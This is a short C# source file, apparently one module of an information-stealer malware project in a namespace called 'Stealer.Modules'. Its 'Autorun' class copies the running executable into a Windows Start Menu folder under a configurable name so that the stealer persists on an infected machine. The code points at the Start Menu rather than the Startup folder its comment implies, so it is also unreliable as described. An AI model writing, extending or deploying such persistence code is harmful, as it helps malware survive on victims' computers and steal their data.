using System;
using System.IO;

namespace Stealer.Modules
{
    internal sealed class Autorun
    {
        // Autorun path
        private static string startup_directory = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
        private static string executeable = System.Reflection.Assembly.GetEntryAssembly().Location;

        // Check if app installed to autorun

        public static bool is_installed()
        {
            return File.Exists($"{startup_directory}\\{config.autorun_name}.exe");
        }

        // Install app to autorun
        public static void install()
        {
            if (config.autorun_enabled)
                File.Copy(executeable, $"{startup_directory}\\{config.autorun_name}.exe");
        }
    }
}
